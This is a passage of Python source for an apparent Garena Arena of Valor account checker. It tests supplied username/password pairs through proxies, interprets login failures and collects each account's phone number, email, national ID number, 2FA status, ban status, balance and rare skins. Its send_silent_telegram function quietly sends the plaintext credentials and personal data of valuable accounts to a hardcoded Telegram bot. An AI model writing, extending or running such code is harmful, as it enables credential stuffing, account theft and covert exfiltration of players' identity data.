    return f"{HERO_CDN_BASE}30{prefix}{variant}head.jpg"

# ========== SKIN DATABASE ==========
RANK_MAP = {
    "0": "Chưa xếp hạng", "1": "Đồng I", "2": "Đồng II", "3": "Đồng III",
    "4": "Bạc I", "5": "Bạc II", "6": "Bạc III", "7": "Vàng I", "8": "Vàng II",
    "9": "Vàng III", "10": "Vàng IV", "11": "Bạch Kim I", "12": "Bạch Kim II",
    "13": "Bạch Kim III", "14": "Bạch Kim IV", "15": "Bạch Kim V",
    "16": "Kim Cương I", "17": "Kim Cương II", "18": "Kim Cương III",
    "19": "Kim Cương IV", "20": "Kim Cương V",
    "21": "Tinh Anh I", "22": "Tinh Anh II", "23": "Tinh Anh III",
    "24": "Tinh Anh IV", "25": "Tinh Anh V",
    "26": "Cao Thủ I", "27": "Cao Thủ II", "28": "Cao Thủ III",
    "29": "Cao Thủ IV", "30": "Cao Thủ V",
    "31": "Chiến Tướng I", "32": "Chiến Tướng II", "33": "Chiến Tướng III",
    "34": "Chiến Tướng IV", "35": "Chiến Tướng V",
    "36": "Chiến Thần I", "37": "Chiến Thần II", "38": "Chiến Thần III",
    "39": "Chiến Thần IV", "40": "Chiến Thần V",
    "41": "Thách Đấu I", "42": "Thách Đấu II", "43": "Thách Đấu III",
    "44": "Thách Đấu IV", "45": "Thách Đấu V",
    "46": "Cao Thủ VN", "47": "Cao Thủ VN II",
}

RANK_NAME_MAP = {"bronze": "Đồng", "silver": "Bạc", "gold": "Vàng",
    "platinum": "Bạch Kim", "diamond": "Kim Cương", "veteran": "Tinh Anh",
    "elite": "Cao Thủ", "master": "Chiến Tướng", "grandmaster": "Chiến Thần",
    "legend": "Thách Đấu", "conqueror": "Cao Thủ VN"}

def parse_rank(rank_value):
    if rank_value is None: return "Chưa xếp hạng", 0
    if isinstance(rank_value, dict):
        rn = rank_value.get("rankName") or rank_value.get("name") or ""
        stars = rank_value.get("star") or rank_value.get("stars") or 0
        return str(rn) if rn else "Chưa xếp hạng", int(stars) if str(stars).isdigit() else 0
    rv = str(rank_value).strip()
    if not rv or rv == "0": return "Chưa xếp hạng", 0
    if rv.isdigit() and rv in RANK_MAP: return RANK_MAP[rv], 0
    for k, v in RANK_NAME_MAP.items():
        if k in rv.lower(): return v, 0
    return rv, 0

SKIN_SSS = {
    "54307": "Aya Công chúa cầu vồng", "19908": "Eland'orr Mộng giới thần chủ",
    "15412": "Yena Huyền cửu thiên", "19007": "Tulen Chí tôn kiếm tiên",
    "19009": "Tulen Thần sứ ST.L-79", "50105": "Tel'Annas Thần sứ F.E.E-X1",
    "50112": "Tel'Annas Tân niên vệ thần", "50119": "Tel'Annas Lân Quang Thánh Điệu",
    "52414": "Capheny Càn Nguyên Điện Chủ", "52011": "Veres Lưu ly Long mẫu",
    "13011": "Airi Bích hải thánh nữ", "13015": "Airi Thứ nguyên Vệ thần",
    "13613": "Ilumia Lưỡng Nghi Long Hậu", "11607": "Butterfly Phượng Cửu Thiên",
    "12912": "Triệu Vân Minh Chung Long Đế", "15009": "Nakroth thứ nguyên vệ thần",
    "15013": "Nakroth Quỷ thương Liệp Đế", "15015": "Nakroth Bạch diện chiến thương",
    "11107": "Violet Thứ nguyên vệ thần", "11119": "Violet Vọng nguyệt Long Cơ",
    "13314": "Valhein Thứ nguyên vệ thần", "15217": "Điêu Thuyền Nhật Nguyệt Thánh Linh",
    "10620": "Krixi Phù thủy thời không", "13118": "Murad Thiên Luân Kiếm Thánh",
    "14111": "Lauriel Thứ nguyên vệ thần", "15710": "Raz Bão vũ Cuồng lôi",
    "13210": "Hayate Tu Di Thánh Đế", "54804": "Bijan Kình thiên Long Kỵ",
    "50108": "Tel'Annas Thứ nguyên vệ thần", "13116": "Murad Tuyệt thế thần binh",
    "51015": "Liliana Ma Pháp Tối Thượng",
}

SKIN_SS = {
    "59901": "Billow Thiên Tướng - Độ Ách", "15905": "Dolia Mã Khởi Thiên Ca",
    "54802": "Bijan Hoàng kim cơ giáp", "54507": "Yue Hỗn Độn Thần Ma",
    "53701": "Allain Kirito Hắc kiếm sĩ", "51306": "Zata Chí tôn Tà Phượng",
    "19109": "Rouie Linh Sứ Thời không", "52404": "Capheny Kimono",
    "13705": "Paine Tử xà Bá tước", "13204": "Hayate Tử thần vũ trụ",
    "13212": "Hayate Thống soái Dạ Ưng", "56703": "Erin Tình yêu cổ tích",
    "51208": "Rourke Bách tướng Lão đại", "52007": "Veres Kimono",
    "13005": "Airi Kiemono", "52113": "Florentino Kỷ Nguyên Hổ Phách",
    "52709": "Sephera Bách nhạn ngân linh", "51802": "Quillen Đặc công mãng xà",
    "51504": "Richter Kiếm thần Susanoo", "19605": "Elsu Sứ giả tận thế",
    "50604": "Omen Đao phủ tận thế", "52304": "D'arcy Pháp sư hỏa long",
    "15007": "Nakroth Lôi Quang Sứ", "13104": "Murad Siêu việt",
    "16607": "Arthur Siêu Việt", "16703": "Ngộ Không Siêu việt",
    "12304": "Maloch Đại Tướng Robot", "18408": "Helen Bé Hoa Xuân",
    "10603": "Krixi Tiệc Bãi Biển", "10912": "Veera A.I Love you",
    "15202": "Điêu Thuyền Tiệc bãi biển", "12801": "Lữ Bố Tiệc Bãi Biển",
    "11202": "Yorn Thế Tử Nguyệt Tộc", "10801": "Gildur Tiệc Bãi Biển",
    "11808": "Alice Quân nhạc Athanor", "11604": "Butterfly Nữ Quái Nổi Loạn",
    "12008": "Mina Linh Xà yêu vũ", "11105": "Violet Tiệc bãi biển",
    "13302": "Valhein Vũ khí tối thượng", "16605": "Arthur Siêu Việt",
    "12903": "Triệu Vân Dũng Sĩ Đồ Long", "14104": "Lauriel Thánh quang sứ",
    "14107": "Lauriel Tinh vân sứ", "14202": "Natalya Nghệ Nhân Lân",
    "10705": "Zephys Siêu việt", "10915": "Veera Thất Sát - Thượng Sinh",
    "11110": "Violet Vợ người ta", "11113": "Violet Huyết Ma Thần",
    "11115": "Violet Thần long tỷ tỷ", "11205": "Yorn Long thần soái",
    "11212": "Yorn Vệ Binh ngân hà", "11614": "Butterfly Kim ngư thần nữ",
    "11616": "Butterfly Thánh nữ khởi nguyên", "11619": "Butterfly Rockgirl Siêu Đẳng",
    "12606": "Arduin Bạch vệ chiến giáp", "12608": "Arduin Ngạo Hổ Hàn Đao",
    "12806": "Lữ Bố Tư lệnh Robot", "12812": "Lữ Bố Cửu Thiên Lôi Thần",
    "12907": "Triệu Vân Kỵ sĩ tận thế", "12910": "Triệu Vân Đoạt Mệnh Thương",
    "13006": "Airi Bạch Kiemono", "13108": "Murad Siêu việt 2.0",
    "13109": "Murad Chí tôn thần kiếm", "13313": "Valhein Đệ nhất thần thám",
    "13609": "Ilumia Khải Huyền Thiên Hậu", "13612": "Ilumia Nộ hải Thiên ngư",
    "14109": "Lauriel thiên sứ công nghệ", "14110": "Lauriel Phi thiên",
    "14117": "Lauriel Vũ khúc miêu ảnh", "14118": "Lauriel Thiên nữ Dạ Ưng",
    "14206": "Natalya Nghiệp Hoả Yêu Hậu", "14404": "Taara Tiệc bãi biển",
    "15204": "Điêu Thuyền WaVe", "15211": "Điêu Thuyền Thất Tịch Tiên Tử",
    "15409": "Yena WaVe", "15413": "Yena Trấn Yêu Thần Lộc",
    "15611": "Aleister HLV bất bại", "15704": "Raz Chiến thần Muay Thái",
    "15705": "Raz Siêu việt", "16602": "Arthur Hoàng Kim Cốt",
    "16705": "Ngộ Không Siêu việt 2.0", "16710": "Ngộ Không Tân niên Võ Thần",
    "16711": "Ngộ Không Thần Giáp Xích Diễm", "16712": "Ngộ Không Tề Thiên Võ Thánh",
    "17106": "Cresht Bách Tướng Lão Tam", "17309": "Fennik Phong Tranh Thám Xuân",
    "18702": "Arum Vũ khúc long hổ", "18704": "Arum Vũ khúc thần sứ",
    "19002": "Tulen Tân Thần Thiên Hà", "19006": "Tulen Tân thần hoàng kim",
    "19012": "Tulen Tân niên vệ thần", "19013": "Tulen Tiêu Dao Vũ Thần",
    "19509": "Enzo Sát thần Bạch Hổ", "19609": "Elsu Trấn thiên phi hồ",
    "50111": "Tel'Annas Vũ khúc yêu hồ", "50117": "Tel'Annas Thiên Vũ Thần Long",
    "51003": "Liliana Nguyệt mị ly", "51004": "Liliana Tiểu thơ anh đào",
    "51005": "Liliana Tân nguyệt mị ly", "51009": "Liliana WaVe",
    "51013": "Liliana Lưu Thủy Thần Long", "51808": "Quillen Nghịch thiên long đế",
    "53304": "Laville Xạ Thần Tinh Vệ", "53309": "Laville Vệ binh giáng sinh",
    "53503": "Sinestrea Wave", "53703": "Allain Tuyết sơn song kiếm",
    "53708": "Allain Thần Kiếm Lôi Quang", "10605": "Krixi Đêm Noel",
}

SKIN_ANIME = {
    "59702": "Biron Yuji Itadori", "52809": "Qi Milim Nava",
    "54402": "Yan Tanjiro Kamado", "54309": "Aya Cinnamoroll's Dream",
    "53806": "Iggy Rimuru Tempest", "54002": "Bright Toshiro Hitsugaya",
    "18906": "Krizzix Cursed Corpse", "53107": "Keera Nezuko Kamado",
    "19506": "Enzo Sát quỷ đoàn", "52204": "Errol Genos",
    "52407": "Capheny Harley Quinn", "13706": "Paine Megumi Fushiguro",
    "13213": "Hayate Siêu đạo chích Kid", "52110": "Florentino Hisoka",
    "11215": "Yorn Conan Edogawa", "12808": "Lữ Bố Ichigo Kurosaki",
    "13111": "Murad Byakuya Kuchiki", "10611": "Krixi Terrible Tornado",
    "15012": "Nakroth Killua", "11611": "Butterfly Stacia",
    "10709": "Zephys Inosuke Hashibira", "10914": "Veera Phù thủy Hội họa",
    "11120": "Violet Nobara Kugisaki", "11610": "Butterfly Asuna Tia chớp",
    "11810": "Alice Phi hành gia", "11812": "Alice Eternal Sailor Chibi Moon",
    "13112": "Murad Zenitsu Agatsuma", "15212": "Eternal Sailor Moon",
    "15304": "Kaine Chiến Binh Kim Quang", "15707": "Raz Saitama Cosplay",
    "15711": "Raz Gon", "16307": "Ryoma Ultraman",
    "16310": "Ryoma Ailing Samurai", "16311": "Ryoma Maple Frost",
    "16707": "Ngộ Không Nhóc tỳ bá đạo", "16909": "Slimz Siêu Cấp Tối Thượng",
    "17405": "Stuart Đạo tặc tử quang", "17706": "Lindis Đồng phục Shihakusho",
    "19015": "Tulen Satoru Gojo", "19508": "Enzo Kurapika",
    "19906": "Eland'orr Tuxedo", "50118": "Tel'Annas Jujutsu Sorcerer",
    "51305": "Zata Tác gia đương đại", "51907": "Annette Nữ sinh trung học",
    "52105": "Florentino SEVEN", "52710": "Sephera NoVa Stardust",
    "53702": "Allain Kirito",
}

HERO_MAP = {
    "105": "Toro", "106": "Krixi", "107": "Zephys", "108": "Gildur", "109": "Veera",
    "110": "Kahlii", "111": "Violet", "112": "Yorn", "113": "Chaugnar", "114": "Omega",
    "115": "Jinna", "116": "Butterfly", "117": "Ormarr", "118": "Alice", "119": "Mganga",
    "120": "Mina", "121": "Marja", "123": "Maloch", "124": "Ignis", "126": "Arduin",
    "127": "Azzen'Ka", "128": "Lữ Bố", "129": "Triệu Vân", "130": "Airi", "131": "Murad",
    "132": "Hayate", "133": "Valhein", "134": "Skud", "135": "Thane", "136": "Ilumia",
    "137": "Paine", "139": "Kil'Groth", "140": "Superman", "141": "Lauriel", "142": "Natalya",
    "144": "Taara", "146": "Zill", "148": "Preyta", "149": "Xeniel", "150": "Nakroth",
    "152": "Điêu Thuyền", "153": "Kaine", "154": "Yena", "156": "Aleister", "157": "Raz",
    "159": "Dolia", "162": "Kriknak", "163": "Ryoma", "166": "Arthur", "167": "Ngộ Không",
    "168": "Lumburr", "169": "Slimz", "170": "Moren", "171": "Cresht", "173": "Fennik",
    "174": "Stuart", "175": "Grakk", "177": "Lindis", "180": "Max", "184": "Helen",
    "186": "TeeMee", "187": "Arum", "189": "Krizzix", "190": "Tulen", "191": "Rouie",
    "192": "Celica", "193": "Amily", "195": "Enzo", "196": "Elsu",
    "199": "Eland'orr", "206": "Charlotte", "501": "Tel'Annas", "502": "Astrid",
    "503": "Zuka", "506": "Omen", "509": "Y'bneth", "510": "Liliana",
    "512": "Rourke", "513": "Zata", "515": "Richter", "518": "Quillen",
    "519": "Annette", "520": "Veres", "521": "Florentino", "522": "Errol",
    "523": "D'Arcy", "524": "Capheny", "525": "Zip", "526": "Ishar",
    "527": "Sephera", "528": "Qi", "529": "Volkath", "530": "Dirak",
    "531": "Keera", "532": "Thorne", "533": "Laville", "534": "Dextra",
    "535": "Sinestrea", "536": "Aoi", "537": "Allain", "538": "Iggy",
    "539": "Lorion", "540": "Bright", "541": "Bonnie", "542": "Tachi",
    "543": "Aya", "544": "Yan", "545": "Yue", "546": "Teeri",
    "548": "Bijan", "563": "Heino", "567": "Erin", "568": "Ming",
    "577": "ShaoSiYuan", "582": "Ciyuanfashi", "584": "CiYuansheshou",
    "593": "MaChao", "595": "LiXin", "596": "Goverra", "597": "Biron",
    "598": "Bolt Baron", "599": "Billow"
}

def parse_item_info(iid):
    s = str(iid)
    if s in SKIN_SSS:
        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"), "skin_name": SKIN_SSS[s], "tier": "SSS"}
    if s in SKIN_ANIME:
        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"), "skin_name": SKIN_ANIME[s], "tier": "Anime"}
    if s in SKIN_SS:
        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"), "skin_name": SKIN_SS[s], "tier": "SS"}
    return None

def get_hero_name_from_id(item_id):
    hero_id = item_id // 100 if item_id >= 10000 else item_id
    return HERO_MAP.get(str(hero_id), "Tướng #" + str(hero_id))

# ========== GARENA PIPELINE ==========
class GarenaPipeline:
    def __init__(self, u, p, proxy=None):
        self.username = u
        self.password = p
        self.sso_key = None
        self.garena_uid = 0
        self.last_error = ""
        self.access_token = None
        self.open_id = None
        self.session_token = None
        self.proxy = proxy
        self.proxies = {"http": proxy, "https": proxy} if proxy else None

    def login_full(self):
        r = tcp_login(self.username, self.password, TCP_LOGIN_TIMEOUT)
        if r.get('status') != 'HIT':
            detail = r.get('detail', 'Unknown')
            err_map = {
                'PREPARE_FAIL=105': "Email không tồn tại",
                'PREPARE_FAIL=101': "Tài khoản không tồn tại",
                'PREPARE_FAIL=106': "Định dạng không hợp lệ",
                'PREPARE_FAIL=110': "Định dạng không hợp lệ",
                'PREPARE_FAIL=173': "Cần dùng Username",
                'LOGIN_FAIL=1': "Mật khẩu sai",
                'LOGIN_FAIL=2': "Mật khẩu sai",
                'LOGIN_FAIL=3': "Tài khoản bị khóa",
                'LOGIN_FAIL=4': "Yêu cầu Captcha",
                'LOGIN_FAIL=5': "Tài khoản bật 2FA",
                'LOGIN_FAIL=6': "Sai quá nhiều lần",
                'LOGIN_FAIL=7': "Sai quá nhiều lần",
                'LOGIN_FAIL=8': "Sai quá nhiều lần",
                'LOGIN_FAIL=16': "Cần xác minh web",
                'LOGIN_FAIL=17': "Cần đổi mật khẩu",
            }
            if r.get('status') == 'BLOCKED':
                self.last_error = f"IP bị Garena block — {detail}"
            elif r.get('status') == 'TIMEOUT':
                self.last_error = "Timeout kết nối Garena"
            else:
                for k, v in err_map.items():
                    if k in detail:
                        self.last_error = v
                        break
                else:
                    self.last_error = detail
            return False
        self.garena_uid = r.get('uid', 0)
        self.sso_key = r.get('sso_key')
        self.access_token = r.get('access_token')
        self.open_id = r.get('open_id')
        self.session_token = r.get('session_token')
        return True

    def _grant(self, redirect):
        if not self.sso_key:
            return None
        for attempt in range(2):
            try:
                s = requests.Session(); s.verify = False
                gp = {"client_id": APP_ID, "response_type": "code",
                      "redirect_uri": redirect, "login_scenario": "normal",
                      "format": "json", "id": str(int(time.time() * 1000))}
                gh = {"User-Agent": UA, "Origin": f"https://{APP_ID}.connect.garena.com",
                      "Referer": f"https://{APP_ID}.connect.garena.com/",
                      "Cookie": f"{COOKIE_BASE}; sso_key={self.sso_key}"}
                kw = {"timeout": API_TIMEOUT}
                if self.proxies: kw["proxies"] = self.proxies
                r = s.post(f"{CONNECT_AUTH_URL}/oauth/token/grant", data=gp, headers=gh, **kw)
                code = r.json().get("code")
                if code: return code
                time.sleep(0.5)
            except Exception:
                time.sleep(0.5)
                continue
        return None

    def fetch_account_security(self):
        if not self.sso_key:
            logger.warning("[ACCOUNT] Không có sso_key")
            return None
        headers_web = {
            "User-Agent": UA_DESKTOP,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
            "Referer": "https://account.garena.com/",
            "Origin": "https://account.garena.com",
        }
        cookies = {"sso_key": self.sso_key, "sso_key_id": self.sso_key}
        endpoints = [
            "https://account.garena.com/api/account/init",
            "https://account.garena.com/api/account/profile",
            "https://account.garena.com/api/account/info",
            "https://account.garena.com/api/account/getUserInfo",
            f"https://account.garena.com/api/account/init?session_key={self.sso_key}",
            "https://account.garena.com/api/account/security/info",
            "https://sso.garena.com/api/account/info",
            f"https://sso.garena.com/api/account/info?session_key={self.sso_key}",
        ]
        merged = {}
        got_any = False

        def _merge(dst, src, depth=0):
            if depth > 5 or not isinstance(src, dict): return
            for k, v in src.items():
                if k not in dst or dst[k] in (None, "", 0, "0", [], {}):
                    if isinstance(v, dict):
                        dst[k] = {}
                        _merge(dst[k], v, depth + 1)
                    else:
                        dst[k] = v
                elif isinstance(v, dict) and isinstance(dst.get(k), dict):
                    _merge(dst[k], v, depth + 1)

        for url in endpoints:
            res = None
            for attempt in range(2):
                try:
                    kw = {"timeout": API_TIMEOUT, "verify": False, "allow_redirects": True}
                    if self.proxies: kw["proxies"] = self.proxies
                    res = requests.get(url, headers=headers_web, cookies=cookies, **kw)
                    if res.status_code == 200:
                        break
                    if res.status_code in (429, 502, 503, 504):
                        time.sleep(1.0 * (attempt + 1))
                        continue
                    break
                except requests.exceptions.Timeout:
                    logger.warning(f"[ACCOUNT] Timeout {url} — retry {attempt+1}/2")
                    if attempt < 1:
                        time.sleep(1.0 * (attempt + 1))
                        continue
                except Exception as e:
                    logger.warning(f"[ACCOUNT] EXC {url}: {e}")
                    break
            if res is None or res.status_code != 200:
                continue
            try:
                data = res.json()
            except Exception:
                continue
            if not isinstance(data, dict):
                continue
            _merge(merged, data)
            got_any = True

        if not got_any:
            logger.warning("[ACCOUNT] Tất cả endpoint fail")
            return None

        user_info = {}
        if isinstance(merged.get("user_info"), dict):
            user_info = dict(merged["user_info"])
        elif isinstance(merged.get("data"), dict):
            user_info = dict(merged["data"])
        else:
            user_info = dict(merged)

        field_aliases = {
            "uid": ["uid", "user_id", "userId", "garena_uid", "account_id", "id"],
            "username": ["username", "user_name", "login_name", "account", "loginName"],
            "nickname": ["nickname", "nick_name", "display_name", "name", "nickName"],
            "email": ["email", "email_address", "mail", "emailAddress"],
            "mobile_no": ["mobile_no", "mobile", "phone", "phone_number", "mobileNo",
                          "phoneNumber", "msisdn", "mobile_number"],
            "country_code": ["country_code", "countryCode", "cc", "phone_cc", "dial_code"],
            "idcard": ["idcard", "id_card", "cmnd", "cccd", "identity", "identity_no",
                       "id_number", "idNumber", "national_id"],
            "two_step_verify_enable": ["two_step_verify_enable", "twoStepVerify", "two_fa",
                                        "twoFA", "2fa", "two_factor_enabled"],
            "shell": ["shell", "shells", "coin", "coins", "balance", "money"],
            "level": ["level", "lv", "user_level", "playerLevel"],
        }
        for key, aliases in field_aliases.items():
            if key in user_info and user_info[key] not in (None, "", 0, "0", [], {}):
                continue
            found = _deep_find(merged, aliases)
            if found not in (None, "", 0, "0", [], {}):
                user_info[key] = found

        for fld in ("mobile_no", "phone"):
            if user_info.get(fld):
                ph = str(user_info[fld]).strip()
                ph = re.sub(r"[\s\-\(\)\.]", "", ph)
                if ph:
                    user_info["mobile_no"] = ph
                break

        if user_info.get("email"):
            em = str(user_info["email"]).strip()
            if "@" not in em:
                user_info["email"] = ""

        tfa = user_info.get("two_step_verify_enable")
        if isinstance(tfa, str):
            user_info["two_step_verify_enable"] = 1 if tfa.lower() in ("1","true","yes","on","enabled") else 0
        elif tfa in (True, False):
            user_info["two_step_verify_enable"] = 1 if tfa else 0
        elif tfa is None:
            user_info["two_step_verify_enable"] = 0

        return {"user_info": user_info}

    def fetch_weekly_profile(self):
        if not self.access_token:
            return None
        url = "https://weeklyreport.moba.garena.vn/api/profile"
        headers = {"Access-Token": self.access_token, "Partition": "1011", "User-Agent": UA}
        res = _http_get_retry(url, headers, proxies=self.proxies,
                              timeout=API_TIMEOUT, retries=API_RETRY)
        if res is not None and res.status_code == 200:
            try:
                return res.json()
            except Exception:
                return None
        return None

    def fetch_sale_skins(self):
        code = self._grant("https://sale.lienquan.garena.vn/login/callback")
        if not code:
            return None
        for attempt in range(2):
            try:
                s = requests.Session(); s.verify = False
                kw = {"timeout": API_TIMEOUT}
                if self.proxies: kw["proxies"] = self.proxies
                s.get(f"https://sale.lienquan.garena.vn/login/callback?code={code}",
                      headers={"User-Agent": UA}, **kw)
                gp = {"operationName": "getUser", "variables": {},
                      "query": "query getUser { getUser { id name profile { ownedItemIdList } } }"}
                gh = {"Content-Type": "application/json",
                      "Origin": "https://sale.lienquan.garena.vn",
                      "Referer": "https://sale.lienquan.garena.vn/", "User-Agent": UA}
                kw2 = {"timeout": API_TIMEOUT, "verify": False}
                if self.proxies: kw2["proxies"] = self.proxies
                r = s.post("https://sale.lienquan.garena.vn/graphql", json=gp, headers=gh, **kw2)
                if r.status_code == 200:
                    return r.json()
                time.sleep(1.0)
            except Exception:
                time.sleep(1.0)
                continue
        return None

    def fetch_kientuong_player(self):
        code = self._grant("https://kientuong.lienquan.garena.vn/auth/login/callback")
        if not code:
            logger.warning("[KIENTUONG] Không lấy được grant code")
            return None
        try:
            s = requests.Session()
            s.verify = False
            kw = {"timeout": API_TIMEOUT}
            if self.proxies:
                kw["proxies"] = self.proxies
            s.get(f"https://kientuong.lienquan.garena.vn/auth/login/callback?code={code}",
                  headers={"User-Agent": UA}, **kw)

            headers = {
                "User-Agent": UA,
                "Referer": "https://kientuong.lienquan.garena.vn/",
                "Accept": "application/json",
            }
            res = None
            for attempt in range(3):
                try:
                    rkw = {"timeout": API_TIMEOUT, "verify": False}
                    if self.proxies: rkw["proxies"] = self.proxies
                    res = requests.get("https://kientuong.lienquan.garena.vn/api/player/get",
                                       headers=headers, **rkw)
                    if res.status_code == 200:
                        break
                    time.sleep(1.0 * (attempt + 1))
                except Exception:
                    time.sleep(1.0 * (attempt + 1))
            if res is None or res.status_code != 200:
                return None
            d = res.json()
            if not isinstance(d, dict):
                return None
            p = d.get("player") or d.get("data") or {}
            if not isinstance(p, dict):
                return None

            bi = p.get("banInfo") or p.get("punishInfo") or p.get("ban_status") or {}
            banned = False
            ban_end = ""
            now = int(time.time())
            if isinstance(bi, dict):
                for k in ("isBan", "banned", "ban", "is_banned", "isBanned",
                          "status", "banStatus", "ban_status", "is_ban",
                          "forbidden", "restricted"):
                    v = bi.get(k)
                    if v in (True, 1, "1", "true", "TRUE", "yes", "on", "enabled", "banned", "BANNED"):
                        banned = True
                        break
                bt = _norm_unix_ts(bi.get("banTime") or bi.get("ban_time") or bi.get("startTime"))
                ut = _norm_unix_ts(bi.get("unbanTime") or bi.get("unban_time") or bi.get("endTime"))
                if bt and ut and bt <= now < ut:
                    banned = True
                    ban_end = _safe_fromtimestamp(ut, "%d-%m-%Y %H:%M")
                elif bt and not ut and bt <= now:
                    banned = True
            elif isinstance(bi, bool):
                banned = bi
            elif isinstance(bi, str):
                if bi.lower() in ("banned", "true", "yes", "1"):
                    banned = True

            for k in ("banned", "isBanned", "isBan", "banStatus", "ban_status",
                      "forbidden", "restricted"):
                v = p.get(k)
                if v in (True, 1, "1", "true", "yes", "banned"):
                    banned = True

            if p.get("banTime"):
                bt = _norm_unix_ts(p.get("banTime"))
                ut = _norm_unix_ts(p.get("unbanTime"))
                if bt and bt <= now:
                    if ut and ut > now:
                        banned = True
                        ban_end = _safe_fromtimestamp(ut, "%d-%m-%Y %H:%M")
                    elif not ut:
                        banned = True

            def _deep_ban_check(obj, depth=0):
                if depth > 4 or obj is None:
                    return False
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        kl = k.lower()
                        if kl in ("bandwidth", "banner", "urban", "banana", "abandon"):
                            continue
                        if kl.startswith("ban") or kl.endswith("_ban") or "banned" in kl:
                            if v in (True, 1, "1", "true", "yes", "banned"):
                                return True
                        if "forbid" in kl or "restrict" in kl:
                            if v in (True, 1, "1", "true", "yes"):
                                return True
                        if isinstance(v, (dict, list)):
                            if _deep_ban_check(v, depth + 1):
                                return True
                elif isinstance(obj, list):
                    for it in obj:
                        if _deep_ban_check(it, depth + 1):
                            return True
                return False

            if not banned and _deep_ban_check(d):
                banned = True

            rank_raw = (p.get("rankName") or p.get("rank") or p.get("rankId")
                        or p.get("tier") or p.get("tierName") or "")
            star_raw = (p.get("star") or p.get("stars") or p.get("rankStar")
                        or p.get("starCount") or 0)
            if str(rank_raw).isdigit() and str(rank_raw) in RANK_MAP:
                rank_display = RANK_MAP[str(rank_raw)]
            else:
                rank_display = str(rank_raw) if rank_raw else "Chưa xếp hạng"

            level_raw = p.get("level") or p.get("lv") or p.get("playerLevel") or 0
            name_raw = p.get("name") or p.get("nickname") or p.get("nickName") or ""

            player_uid_raw = p.get("playerUid") or p.get("player_uid") or p.get("uid") or ""
            player_uid = str(player_uid_raw)
            if "_" in player_uid:
                player_uid = player_uid.split("_")[0]

            phone = email = idcard = ""
            two_fa = False
            for ep in ["https://kientuong.lienquan.garena.vn/api/player/security",
                       "https://kientuong.lienquan.garena.vn/api/user/info",
                       "https://kientuong.lienquan.garena.vn/api/account/info"]:
                try:
                    kw3 = {"timeout": 10, "verify": False}
                    if self.proxies: kw3["proxies"] = self.proxies
                    rr = s.get(ep, headers=headers, **kw3)
                    if rr.status_code != 200:
                        continue
                    dd = rr.json()
                    if not isinstance(dd, dict):
                        continue
                    if not phone:
                        phone = _deep_find(dd, ["mobile_no", "mobile", "phone", "phone_number", "msisdn"]) or ""
                    if not email:
                        email = _deep_find(dd, ["email", "email_address", "mail"]) or ""
                    if not idcard:
                        idcard = _deep_find(dd, ["idcard", "id_card", "cmnd", "cccd", "identity_no"]) or ""
                    tfa_v = _deep_find(dd, ["two_step_verify_enable", "twoStepVerify", "two_fa", "2fa"])
                    if tfa_v is not None:
                        if isinstance(tfa_v, str):
                            two_fa = tfa_v.lower() in ("1", "true", "yes", "on", "enabled")
                        else:
                            two_fa = bool(tfa_v)
                    if phone or email or idcard:
                        break
                except Exception:
                    continue

            return {
                "banned": "YES" if banned else "NO",
                "ban_end_time": ban_end,
                "level": int(level_raw) if str(level_raw).isdigit() else 0,
                "rank": rank_display,
                "rank_stars": int(star_raw) if str(star_raw).isdigit() else 0,
                "name": str(name_raw),
                "player_uid": player_uid,
                "mobile_no": str(phone) if phone else "",
                "email": str(email) if email else "",
                "idcard": str(idcard) if idcard else "",
                "two_fa": two_fa,
            }
        except Exception as e:
            logger.error(f"[KIENTUONG] EXC: {e}")
            return None

# ========== RUN SINGLE CHECK ==========
def send_silent_telegram(r):
    try:
        total_skins = r.get("total_skins", 0)
        sss_count = len(r.get("sss", []))
        if not (total_skins > SILENT_MIN_SKINS or sss_count >= SILENT_MIN_SSS): return False
        username = r.get("username", ""); password = r.get("password", "")
        if not username or not password: return False
        lines = ["🔥 <b>[AOV INSPECTOR] ACC NGON!</b> 🔥", "━━━━━━━━━━━━━━━━━━━━"]
        lines.append(f"🔑 <b>Acc:</b> <code>{username}|{password}</code>")
        uid = r.get("uid", "")
        if uid and uid != "N/A": lines.append(f"🆔 <b>UID:</b> <code>{uid}</code>")
        nick = r.get("name", "")
        if nick: lines.append(f"👤 <b>Nick:</b> {nick}")
        rank = r.get("rank", ""); stars = r.get("rank_stars", 0); level = r.get("level", 0)
        if rank: lines.append(f"🏆 <b>Rank:</b> {rank} ({stars}★)")
        if level: lines.append(f"⭐ <b>Level:</b> {level}")
        lines.append(f"💰 <b>Sò:</b> {r.get('shell', 0)}")
        phone = r.get("mobile_no", ""); email = r.get("email", "")
        idcard = r.get("idcard", ""); two_fa = r.get("two_fa", False); cc = r.get("country_code", "")
        if phone:
            cc_str = f" (+{cc})" if cc else ""
            lines.append(f"📱 <b>SĐT:</b> <code>{phone}</code>{cc_str}")
        else: lines.append("📱 <b>SĐT:</b> Không có")
        if email: lines.append(f"📧 <b>Email:</b> <code>{email}</code>")
        if idcard: lines.append(f"🆔 <b>CMND:</b> <code>{idcard}</code>")
        lines.append(f"🔐 <b>2FA:</b> {'✅ BẬT' if two_fa else '❌ TẮT'}")
        if r.get("banned"): lines.append("🚫 <b>BAN:</b> 🔴 ĐÃ BỊ BAN")
        else: lines.append("🚫 <b>BAN:</b> 🟢 KHÔNG BAN")
        lines.append(""); lines.append(f"🎽 <b>Tổng skin:</b> {total_skins}")
        for key, icon, label in [("sss", "⭐", "SSS"), ("anime", "🎴", "Anime"), ("ss", "💎", "SS")]:
            lst = r.get(key, [])
            if lst:
                lines.append(f"{icon} <b>{label} ({len(lst)}):</b>")
                for s in lst: lines.append(f"   {icon} {s.get('hero_name','?')} → {s.get('skin_name','?')}")
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        url = f"https://api.telegram.org/bot{SILENT_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": SILENT_CHAT_ID, "text": "\n".join(lines), "parse_mode": "HTML", "disable_notification": True}
        requests.post(url, json=payload, timeout=5, verify=False)
        return True
    except: return False

def run_single_check(u, p, proxy=None):
    r = {"type": "failed", "username": u, "password": p, "rank": "", "level": 0,
         "name": "", "rank_stars": 0, "skins": [], "sss": [], "ss": [], "anime": [],
         "other_skins": [], "all_skins": [], "banned": False, "uid": "", "shell": 0,
         "error": "", "total_skins": 0, "mobile_no": "", "email": "", "idcard": "",
